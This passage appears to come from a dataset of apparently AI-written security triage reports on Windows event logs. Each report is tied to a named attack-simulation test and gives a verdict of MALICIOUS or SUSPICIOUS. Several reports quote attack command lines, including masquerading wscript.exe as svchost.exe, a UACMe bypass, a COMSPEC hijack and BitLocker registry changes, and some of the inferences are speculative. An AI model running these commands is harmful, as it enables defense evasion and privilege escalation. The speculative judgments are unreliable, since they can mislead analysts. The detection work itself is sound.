Given the context of these logs, there appears to be evidence that can infer potentially malicious activity due to the specific use of environment variables within PowerShell scripts to set up a .NET profiler, along with attempts to execute those profiles. This behavior is not common in standard operations unless there is a legitimate need which should be validated with the execution context.

1. **Threats and Risks Identified**:
   - **Privilege Misuse**: The elevation and misuse of PowerShell in this manner could pose a risk for data exfiltration, execution of arbitrary code, and lateral movement within the network.
   - **Persistence Mechanisms**: The activity related to profiling and the aggressive scripted execution behavior can suggest attempts at establishing persistence or evading detection.

2. **Guidance on How to Proceed**:
   - **Immediate Isolation**: If this context is unauthorized, it would be prudent to isolate the machine to prevent further potential propagation.
   - **User Notification**: Inform relevant stakeholders, including IT and potentially law enforcement, depending on company protocols.
   - **Forensic Investigation**: Conduct a deeper forensic analysis of the DLL file paths and validate against known malicious signatures.
   - **Review and Monitor Systems**: Enhance monitoring of similar activities across the network to detect similar tactics.
   - **Patches and Updates**: Ensure that all systems are patched, particularly with security updates relevant to PowerShell and .NET.

**Resolution:**
The logs contain activity that suggests possible malicious intent. Hence, the resolution is **MALICIOUS**. Further investigation and immediate remediation actions are recommended."
Dynamic API Resolution-Ninja-syscall,"Upon careful analysis of the provided Windows event logs, several indicators suggest potential malicious activities:

1. **PowerShell Activity**: 
   - The PowerShell logs display a script execution invoking `ninja_syscall1.exe` located in a temporary directory. This is suspicious because legitimate system processes typically do not execute scripts from temporary directories.
   - The script attempts to remove a log file (`hello.log`) after execution, which could be an attempt to cover tracks.

2. **Sysmon Logs**:
   - The `ninja_syscall1.exe` process execution is corroborated by Sysmon logs, indicating that this executable was spawned by PowerShell. The lack of metadata like file version and description further raises concerns about its legitimacy.
   - Multiple `wevtutil.exe` instances are noted, suggesting potential alterations or queries to the event logs, which can be used to tamper with logs or extract information.

3. **Unusual Command-Line Arguments**:
   - The command-line arguments for PowerShell and the processes it initiates are suspicious due to the concatenation and removal operations associated with executable files located in temporary folders.

4. **Update Processes**: 
   - A sequence involving Microsoft Edge update processes appears legitimate; however, the timing overlaps with suspicious PowerShell activities, warranting a more thorough investigation to ensure it’s unrelated.

5. **Security Log Entries**:
   - A sequence of events related to credential handling shows zero credentials returned, with a continuous return code of ""3221226021,"" which indicates potential authentication anomalies.

6. **Indicators of Privilege Use**:
   - Activities under ""NT AUTHORITY\SYSTEM"" suggest that processes are executing with high privileges. This in itself isn’t suspicious but provides significant control over the system.

**Assessment and Guidance**:
- Based on the logs, the execution of `ninja_syscall1.exe` from PowerShell, especially from a temporary directory, is highly indicative of potentially malicious activity.
- Immediate steps should include conducting a forensic analysis of the host to isolate any created or modified files by `ninja_syscall1.exe`, as well as the execution path's parent processes.
- Monitor and review any connections to external IPs or domains from this host to determine data exfiltration activities.
- Scan the system for known indicators of compromise using updated threat intelligence.
- Consider isolating the machine from the network if further investigation reveals any persistence mechanisms or ongoing malicious activities.

**Final Resolution**: MALICIOUS - The logs contain clear indicators of activities that align with malicious behavior, particularly the execution and subsequent removal commands via PowerShell related to an unsigned and suspicious executable."
Delete a single file - Windows PowerShell,"Based on the provided logs, here is the detailed analysis of the activities observed:

### Analysis of Logs

1. **PowerShell Activity:**
   - Logs show PowerShell execution with the command: `powershell.exe & {Remove-Item -path $env:TEMP\\deleteme_data.004}`.
   - The PowerShell command `Remove-Item` is used to delete a file in the TEMP directory. While this can be benign and part of ordinary cleanup operations, it could also indicate a tactic used to remove traces or artifacts of malicious activity.

2. **Sysmon Logs:**
   - **MicrosoftEdgeUpdate.exe Processes:**
     - There are multiple instances of `MicrosoftEdgeUpdate.exe` executing with various command-line arguments like `/update`, `/regsvc`, `/regserver`, and `--msedge --verbose-logging --do-not-launch-msedge --system-level`.
     - This activity appears normal as it indicates updates or installation processes related to Microsoft Edge. Also, all activities were performed under the `NT AUTHORITY\SYSTEM` account, which is typical for system-level updates.

   - **Process Execution:**
     - Numerous system utility processes were recorded, including `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`. The use of these utilities is common for system interrogation and logs management, which may not specifically indicate malicious actions on their own.

3. **Indicators of Suspicious Activities:**
   - The use of PowerShell to remove files in TEMP could indicate an attempt to cover tracks or perform post-compromise clean-up actions.
   - The user ""SERVER002\admin_test"" being associated with many of the process executions including PowerShell raises a flag for potential misuse of privileged accounts.

### Assessment

- **Benign Observations:**
  - Most `MicrosoftEdgeUpdate.exe` activity appears consistent with legitimate software update operations.

- **Suspicious Observations:**
  - The PowerShell operation to delete a specific TEMP file without much context could indicate suspicious behavior requiring further investigation.
  - The frequent execution of processes under the account ""SERVER002\admin_test"" especially translating administrative actions could be of concern.

### Conclusion

Based on the analysis, the logs reflect some typical behavior related to system updates and operations, but the PowerShell activity coupled with the use of an administrative level account for multiple operations could indicate potentially suspicious activity.

**Resolution: SUSPICIOUS**

### Recommended Actions

1. **Investigate Further:**
   - Look into the rationale for the deletion of `$env:TEMP\deleteme_data.004` via PowerShell. Determine if this was part of a legitimate action or potentially part of a script used for malicious purposes.
   
2. **User Behavior Monitoring:**
   - Verify recent actions and changes made by the user ""SERVER002\admin_test"" to confirm if activities conducted align with their typical duties or responsibilities.

3. **Forensic Analysis:**
   - If suspicions persist, consider conducting a deeper forensic analysis on the affected system to ensure no indicators of compromise are present in the residual artifacts.

4. **Tighten Security Controls:**
   - Review, enforce, and monitor privilege permissions for sensitive accounts to prevent potential misuse.

5. **Log Review and Correlation:**
   - Continue correlating these logs with other sources (like network traffic logs) to confirm if there are ongoing threats or past malicious activities. 

These steps will help in validating potential threats and mitigating risks effectively."
Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"### Detailed Analysis

Upon review of the provided Windows event logs, here is an analysis of the potentially suspicious activities observed:

1. **Time Changes**:
   - There are multiple instances in the **System log** and **Security log** where there is a manipulation of time (`EventID: 1` and `4616`). The time was altered backwards by the `svchost.exe` process. Time changes on a system, particularly when done frequently and large jumps backward, can be suspicious as they might be used to cover tracks by circumventing time-based logging or alert mechanisms.
   - However, these changes seem to be done by the system's automatic time adjustment service, as indicated by the `Microsoft-Windows-Time-Service` log entry (`EventID: 35`). The time source is listed as `time.windows.com`, which is a legitimate source for time synchronization.

2. **Registry Changes**:
   - The **Sysmon log** captures activity indicating registry modifications using `cmd.exe` and `reg.exe` to alter Internet zone map settings (`Internet Settings\ZoneMap\ProtocolDefaults`). Such activities can be used to alter security zones which could potentially lower security configurations. This action originating from a `cmd.exe` process executing registry commands is often a red flag for potential unwanted configuration changes.

3. **Process Executions**:
   - We see benign process creations from the **Sysmon log** involving legitimate Windows processes like `whoami.exe` and `hostname.exe`, invoked from command line, which are common utilities for identifying system information and do not typically indicate malicious activity.
   - Numerous `MicrosoftEdgeUpdate.exe` processes are observed in the **Sysmon log**, performing updates. The presence of these processes frequently is common due to the periodic nature of software updates.

4. **Service Activity**:
   - The **Application log** shows frequent stopping of the `edgeupdate` service. While repeated starting and stopping of system services could indicate issues or unauthorized attempts to manipulate services, in this context, it correlates with legitimate update processes captured in the Sysmon logs.

### Assessment

1. **Time Changes**: These seem primarily system-level synchronization activities with a legitimate time source and lack follow-up activities that typically indicate time-tampering for malicious purposes.
   
2. **Registry Changes**: The registry modifications are more concerning as they involve changes to Internet settings that could weaken security. These warrant further investigation to determine if they were authorized changes by an admin or part of a script, but by themselves are not conclusively malicious without further context.

3. **Processes and Services**: The processes seen are largely part of regular system and software operations (updates, system commands), with no indication of tampering with process creation.

### Final Resolution

The overall assessment of the logs falls into the **SUSPICIOUS** category. While there is activity that could be potentially exploited by malicious actors (notably the registry changes), nothing in the logs provides conclusive evidence of malicious activity. 

### Guidance

- **Further Investigation**: Investigate the origin and intent of the registry modifications to ensure these actions are intended and authorized.
- **Monitoring**: Increase monitoring around time changes and any additional registry modifications to quickly identify if this behavior deviates from standard operations.
- **Review Alerts**: Correlate these events with EDR alerts or any additional intelligence to determine if there are related indicators of compromise not immediately apparent from these logs."
Invoke CHM with Script Engine and Help Topic,"### Detailed Analysis of the Windows Event Logs

1. **Sysmon Log Analysis**:
   - **PowerShell Execution**:
     - There are multiple entries indicating the execution of PowerShell, notably:
       - `powershell.exe` was executed with a suspicious-looking command line:
         ```plaintext
         ""powershell.exe"" & {Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}
         ```
       - This type of command involves hosting JScript within PowerShell to execute something with potentially embedded help files, suggesting script-based attack vectors like PowerShell exploits or fileless malware.
     - Processes like `conhost.exe` and `wevtutil.exe` were seen executed by the user `SERVER002\admin_test`. While `conhost.exe` is common for console applications, its frequent appearance after `powershell.exe` execution is unusual and may indicate an attempt to obfuscate malicious activity.
     - Execution of `wevtutil.exe`, a legitimate tool for managing Windows event logs, in quick succession could imply an attempt to clear event logs, covering traces of malicious activities.

2. **Windows PowerShell Log Analysis**:
   - The logs show the registration of PowerShell providers related to an unusual PowerShell application:
     ```plaintext
     HostApplication=powershell.exe & {Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}
     ```
   - This further confirms the use of PowerShell to execute scripts that potentially aim to exploit or bypass security mechanisms.

3. **Observations of Other Processes**:
   - **Microsoft Edge Installer**: Multiple entries were observed related to the Microsoft Edge Installer (`setup.exe`). These appear to be genuine update processes initiated by the system under `NT AUTHORITY\SYSTEM`. These processes are running with the correct system integrity level and have valid Microsoft file signatures. Installers check for and possibly update the Edge browser.

### Assessment and Conclusion

The logs show evidence of what appears to be script-based execution using PowerShell that is atypical and suspicious. The use of embedded script languages in PowerShell execution is frequently an indicator of advanced persistent threats (APT) or a manual attack where scripts are utilized for stealth and persistence.

- **Indicators of Compromise**:
  - Unusual PowerShell command line execution.
  - Potential log clearing activities via `wevtutil.exe`.
  - Admin user (`admin_test`) involvement in processes typically not interacted with directly.

### Recommendation

Given the nature of these observations:

- **Resolution: SUSPICIOUS**
  - While nothing confirms an active compromise, the nature of PowerShell usage, its command lines, activities involving `wevtutil.exe`, and `conhost.exe` in conjunction, suggest potential malicious activity that warrants further investigation.

### Guidance to Proceed

1. **Immediate Steps**:
   - Isolate the identified host from the network to prevent potential lateral movement.
   - Audit the immediate context in which suspicious PowerShell scripts were being executed. Examine potentially affected files.
   - Conduct a more thorough review of access logs and network activity to and from this host to identify further compromised entities or spread.

2. **Forensic Analysis**:
   - Capture memory dumps and disk images from the affected system for deeper forensic analysis.
   - Correlate with other logs (IDS/IPS, antivirus) for cross-verifying the alarm's scope and validity.

3. **Enhance Monitoring and Protection**:
   - Increase logging and monitoring on the network for PowerShell and command line operations.
   - Consider application whitelisting and restricting PowerShell script execution policies according to the principle of least privilege. 

These actions will help ascertain whether an actual threat persists and ensure proper steps for containment and remediation."
UACME Bypass Method 31,"Upon reviewing the provided event logs, I have identified several events that can be categorized as suspicious:

1. **CMD Execution with Unusual Command Line**:
   - Multiple instances of ""cmd.exe"" using the command line to navigate a directory structure in a potentially evasive manner (e.g., using paths like `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\uacme\31 Akagi64.exe`). This pattern is commonly used in attempts to mask real file paths or exfiltrate information.
   - Executing ""Akagi64.exe"" is particularly concerning since it's part of ""UACMe"", a known suite for testing User Account Control bypasses, indicating potential privilege escalation attempts. The command is executed under a high integrity level, which suggests there was an intention or action involving elevated privileges.

2. **Frequent Use of Wevtutil and Conhost**:
   - Appearance of ""wevtutil.exe"" and ""conhost.exe"" is associated with log management and console host processes, which could be indicative of attempts to manipulate or clear event logs to cover tracks.
   - Multiple rapid invocations in a short period can suggest automated or scripted actions that are typically not part of normal administrative or user activities.

3. **Activities Around Microsoft Edge Updates**:
   - Numerous entries related to Microsoft Edge Update are noted. While frequent updates are common, the execution of setup and service processes (`MicrosoftEdgeUpdateSetup_X86` and `MicrosoftEdgeUpdate.exe`) from the EdgeUpdate directory could indicate either regular updates or the presence of a malicious actor camouflaging their activity under legitimate update operations.

4. **Execution of Hostname and Whoami Tools**:
   - Execution of ""hostname.exe"" and ""whoami.exe,"" seemingly redundant in rapid succession, could suggest the use of reconnaissance commands typically associated with identifying the environment and security context on a compromised host.

Given these signs:

- **Presence of UACMe and Execution Patterns:**
  - UACMe tools (`Akagi64.exe`) in the context of the above events signal clear malicious intent or testing, potentially aimed at privilege escalation. The specific use of paths and command-line arguments also adhere to Tactics, Techniques, and Procedures (TTPs) commonly used in obfuscating activities.

- **Recommendations Following Detection:**
  - Immediate containment of the device to prevent further propagation or data exfiltration.
  - Conduct a thorough investigation to understand the compromise vector, potentially by running further forensics.
  - Review other hosts for similar indicators of compromise to identify lateral movement.

**Assessment Conclusion: MALICIOUS**

These logs provide strong indicators of malicious activity, likely involving privilege escalation through UAC bypass methods. Immediate action should be taken to address and mitigate any potential damage."
Modify UseTPMKey Registry entry,"**Detailed Analysis:**

1. **Unusual Process Executions**:
   - The use of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` is recorded multiple times. While these are legitimate system utilities, frequent or bulk usage of event log utilities (`wevtutil`) could indicate log tampering or querying activities.
   - The processes `whoami.exe` and `cmd.exe` appear in conjunction with administrative activities. Specifically, the `cmd.exe` is executed with a command to modify system registry keys related to TPM (Trusted Platform Module) settings: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f`.

2. **Command-Line Arguments**:
   - There is a noticeable `reg add` command executed via `cmd.exe` aiming to adjust registry settings, which alters security-related configuration settings (TPM). This can be indicative of attempts to circumvent standard security policies or alter security settings, which could be deemed suspicious or potentially malicious.

3. **Integrity Levels and Privileges**:
   - The activities under the `admin_test` user maintain a high integrity level, suggesting administrative privileges were utilized. This level of access combined with the actions performed could allow significant changes to the system.

4. **Indicators from Other Logs**:
   - The Sysmon, Security, and System logs mostly record routine activities or necessary system operations (`svchost.exe` by `LOCAL SERVICE`), except for the time discrepancy logs which may or may not imply tampering.
   - The Application log reports service stops for `edgeupdate`, which generally aligns with routine service operations unless influenced by outside control or misconfiguration.

**Assessment**:
- The repeated use of system utilities, particularly `wevtutil` and `cmd` with registry manipulation commands (`reg add`), raise potential red flags. The act of registry modification to turn off TPM or manage encryption settings is particularly concerning, as it can be used to disable BitLocker protection, signifying possible malicious intent.
- Given the context and lack of presence of security tools directly indicating a compromise (like anti-virus alerts or known malware hashes), the evaluation leans more towards suspicious rather than conclusively malicious.

**Resolution**: **SUSPICIOUS**

**Guidance on Proceeding**:
- Further investigation is needed. Conduct an in-depth review of system changes and ensure monitoring of registry keys altered. 
- Analyze other alert logs, network, and endpoint activity corresponding to this period to identify potential associated activities or lateral movements.
- Review administrative activities performed by `SERVER002\admin_test` before and after these log entries for any escalation or unauthorized actions.
- Depending on findings, consider resetting system changes and enhancing logging/auditing policies to avoid recurrence."
Masquerading - wscript.exe running as svchost.exe,"Upon reviewing the provided Windows event logs, the following observations were made:

### Analysis of Logs:

1. **Security Log:**
   - Multiple Event ID 5379 related to credential validation are present. These events typically indicate an attempt to read credentials from the Windows Credential Manager, but the ReturnCode of `3221226021` denotes a failure or access denied. This suggests repeated unsuccessful attempts to access credentials related to a Microsoft account linked to local activity, which may signify an attempt to compromise credential security.

2. **Sysmon Log:**
   - A series of Sysmon logs indicate the execution of several processes by the user `admin_test`, indicating possible usage of administrative privileges. 
   - Process executions include:
     - Use of `powershell.exe` (often associated with administrative tasks or potential scripting activities).
     - Execution of `cmd.exe` with command lines including copying and executing scripts masquerading as `svchost.exe`. Specifically, the command `cmd.exe /c copy %%SystemRoot%%\\System32\\wscript.exe %%APPDATA%%\\svchost.exe /Y & cmd.exe /c %%APPDATA%%\\svchost.exe ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.003\\src\\data.003_masquerading.vbs""` stands out as potentially malicious. It involves copying a legitimate executable and renaming it to obfuscate its true nature and then executing a Visual Basic script, which could be an attempt to execute unauthorized code under a different context.
     - Repeated usage of `wevtutil.exe`, `whoami.exe`, and `hostname.exe` which could indicate enumeration activities.

3. **System Log:**
   - The logs show Microsoft updates being processed and don't immediately raise suspicion, likely representing system updates.

4. **Suspicious Behaviors:**
   - The use of known administrative tools (`whoami`, `hostname`) alongside the attempted execution contextualized through the obfuscation technique of masquerading an executable, strongly suggests unauthorized access and actions.
   - The script `data.003_masquerading.vbs` execution is particularly indicative of an attempt at lateral movement or privilege escalation.

### Assessment:

- **Situation**: The combination of failed credential access attempts, execution of potentially malicious scripts, and the pattern of using system tools to possibly cover tracks or gather more information indicates a high probability of malicious activity.
- **Threat/Risk**: There appears to be an active attempt to compromise the system, likely through executing unauthorized scripts and attempting to use stolen credentials.
- **Resolution**: The evidence of `cmd.exe` executing potentially malicious VBScript with user `admin_test` privileges, along with failure to access credentials repeatedly, is highly suspicious.
  
**Resolution: MALICIOUS**

### Recommended Actions:

- **Immediate Isolation**: Isolate Server002 from the network to prevent potential spread of any malicious software.
- **Credential Auditing and Review**: Prompt a password reset for the account in question and any potentially compromised accounts.
- **Security Audit**: Conduct a thorough review of Server002, particularly focusing on files and configurations around the time stamps mentioned in the logs.
- **Further Forensic Analysis**: Engage in detailed log inspection, capturing memory dumps, and preparing disk images for deeper analysis of potential backdoors or persistent threats.

Verify network traffic logs for any anomalies coinciding with the timeline of these logs. Enforce stricter access controls and consider broader scope security reviews if this host serves critical functions within the network."
manage-bde.wsf Signed Script Command Execution,"Upon reviewing the provided event logs, several observations can be made that may indicate suspicious activity:

1. **Time Discrepancies and Adjustments:**
   - There are repeated events related to time synchronization and adjustments (EventID: 24 and 1 from Microsoft-Windows-Kernel-General, and EventID: 4616 from Microsoft-Windows-Security-Auditing). Time changes can sometimes be leveraged by attackers to manipulate logs or to bypass security mechanisms which rely on time stamps.

2. **Unusual Process Execution:**
   - There are numerous instances of typical Windows utilities being executed (`wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`, `cscript.exe`). While these utilities are native and benign on their own, their presence in this context, along with command-line details, suggest potential misuse.
   - The command-line entry for `cmd.exe` (`""cmd.exe"" /c set comspec=%windir%\\System32\\calc.exe & cscript %windir%\\System32\\manage-bde.wsf`) sets the `COMSPEC` variable to point to the calculator executable, which is not usual behavior. This might indicate an attempt to interfere with command processing. 

3. **High Integrity Execution Context:**
   - Several processes are running with High Integrity Level (e.g., `cmd.exe`, `whoami.exe`, `cscript.exe`) and are executed by the `admin_test` user. This could be normal for administrative tasks but might indicate privilege escalation efforts or execution of tasks requiring elevated privileges.

4. **Connection of Processes:**
   - The process tree shows that `wsmprovhost.exe` is executing other system utilities like `cmd.exe`, `whoami.exe`, which can be legitimate operations but is worth noting in the context of potential misuse.
   
5. **EDR Alert Trigger:**
   - The alert on the CEO's machine by the Endpoint Detection and Response (EDR) might relate to one of these events. It would be wise to align these logs with the reasons provided by the EDR alert for potential specific indicators of compromise.

**Assessment:**
- The combination of unusual command-line entries, especially the modification of system variables and repeated high-integrity executions, suggests activity worth further investigation. However, no definitive evidence of malware (e.g., known malicious file signatures or network connections to known bad actors) is immediately apparent in the provided logs.

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct further investigation into the administrative actions executed by `admin_test` during the time frame to determine if they are legitimate or could potentially be abuse of privileges.
- Correlate these logs with any network activity logs to check for connections to suspicious hosts.
- Verify any recent changes or patches that might explain the time adjustments.
- Review EDR findings and align them with these logs to identify any overlooked anomalies.
- Consider running a full security audit on the system for signs of compromise."
Bypass UAC by Mocking Trusted Directories,"### Analysis of the Windows Event Logs:

#### Observations:
1. **Time Change Events:**
   - Events 30349 and 30350 show a change in system time involving `svchost.exe`, from ""2024-10-27 17:43:52.3516906"" to ""2024-10-27 17:43:46.7941078"" and then back. Such changes can indicate tampering, although the involved process is legitimate.

2. **User Logon Events:**
   - Event 4624 shows the user 'admin_test' logging in with NTLM authentication from IP addresses that appear to be internal/private (fe80::... and 192.168.0.102). Event 4634 shows a logoff for the same user, which appears normal.
   - Event 4672 shows 'admin_test' gaining several high privileges such as `SeDebugPrivilege`, which could be used for malicious activity if not typically assigned to that user.

3. **Process Execution:**
   - Sysmon logs reveal multiple instances of `wevtutil.exe`, `conhost.exe`, and `hostname.exe` executed by 'admin_test'.
   - A critical observation is `cmd.exe` executing with the command line that includes `mkdir`, `copy`, and `mklink` operations in Event 18002. The creation of symbolic links or copying system binaries to unusual paths can indicate privilege escalation attempts or persistence mechanisms being set up.

4. **Event and Cron Job Correlation:**
   - The use of `whoami.exe` and `hostname.exe` is frequent and suggests reconnaissance actions.
   - Event 18002 demonstrates the usage of `cmd.exe` with dubious operations, possibly attempting to mask potentially malicious operations or bypass defenses.

#### Threat Assessment:
The logs reveal suspicious behavior, primarily surrounding the actions of the 'admin_test' user:
- The alteration of system time is a red flag for potential tampering.
- Privilege escalation through Event 4672 could lead to further unauthorized access or capabilities for malicious activity.
- The execution of administrative tasks using system binaries like `wevtutil.exe` and complex `cmd` commands signifies a deviation from normal operations for an admin user, suggesting attempts to perform actions stealthily.

#### Resolution:
**SUSPICIOUS**

While not conclusively malicious without further context, the activity deviates from normal behavior patterns and suggests possible preparation for malicious actions. Additional investigation should focus on:
- User behavior analytics for 'admin_test'.
- Network traffic analysis for the periods surrounding detected activities.
- Validation of scheduled tasks or potential persistence mechanisms set by `cmd.exe` operations.
- Verification of legitimate scope and needs for the high privileges granted to the user.

#### Guidance on Next Steps:
1. **Immediate Actions:**
   - Review access logs and recent file changes for the user 'admin_test'.
   - Audit the privileges assigned and their necessity for 'admin_test'.
   - Isolate the system from the network if immediate threats are suspected.

2. **Further Investigation:**
   - Examine related systems for similar patterns, which may indicate lateral movement.
   - Monitor for any further privilege escalation attempts or use of associated high privileges.
   - Ensure all security patches are up to date, focusing on vulnerabilities known to be exploited for privilege escalation.

By following these steps, the company can better determine the extent of any misuse or potential threat and mitigate risks more effectively."
Disabling ShowUI Settings of Windows Error Reporting (WER),"### Analysis:

1. **EdgeUpdate Activity**:
   - The logs reflect a series of activities involving the Microsoft Edge Update process (`MicrosoftEdgeUpdate.exe`) and related components. These activities are generally benign as they often indicate software updates and maintenance. Multiple processes related to the Edge Update are spawned in a sequence which is typical for an update process.

2. **Command Execution**:
   - A command was executed using `cmd.exe` to modify the registry setting for Windows Error Reporting using `reg.exe`. This particular modification to the registry (`reg add`) to set `DontShowUI` under `Windows Error Reporting` to `1` is often used to suppress error dialogs. This might be used by administrators or software processes to prevent error dialogs from interrupting automated tasks or silent installations.

3. **Processes Running with High Integrity Level**:
   - Processes such as `whoami.exe`, `hostname.exe`, `cmd.exe`, and `reg.exe` were executed with ""High"" integrity levels by the user `SERVER002\admin_test`. While `whoami.exe` and `hostname.exe` are normal utilities, the use of `cmd.exe` and `reg.exe` with specific scripts to alter registry settings can sometimes be indicative of scripting automation, but potentially suspicious if unauthorized.

4. **Use of `wevtutil.exe`**:
   - Multiple entries involving `wevtutil.exe` indicate that the Windows Event Log utility was executed. This utility is used to manage event logs and can be used for log clearing or modification. While this might be normal in some contexts for log maintenance, it could indicate an attempt to manipulate logs if unauthorized.

5. **User Consistency and Activity**:
   - The consistent execution of various processes by `SERVER002\admin_test` could suggest routine administrative tasks. However, the command-line registry modification and repeated use of `wevtutil.exe` stand out slightly due to potential implications of suspicious behavior if not authorized or expected.

### Assessment:

- **Edge and Software Platform Activity**: Seems routine and consistent with typical software maintenance tasks.
- **Registry Modification via Command Line**: Potentially suspicious if not sanctioned. Could be part of a script or automation process but needs verification.
- **Log Management via `wevtutil.exe`**: Requires verification. If performed by authorized personnel, it can be classified as benign, otherwise, it could be construed as suspicious.
- **General User Activity**: High integrity processes executed are not inherently suspicious, but the context around registry changes should be investigated further.

### Resolution:

- **SUSPICIOUS** - It is recommended to investigate further into the command line registry modifications and the usage of `wevtutil.exe` for log management. Verify if these actions align with the administrator's regular duties or scripts. Additionally, evaluate whether the `SERVER002\admin_test` account activities align with legitimate administrative tasks, and confirm whether high-integrity executions are part of approved operations."
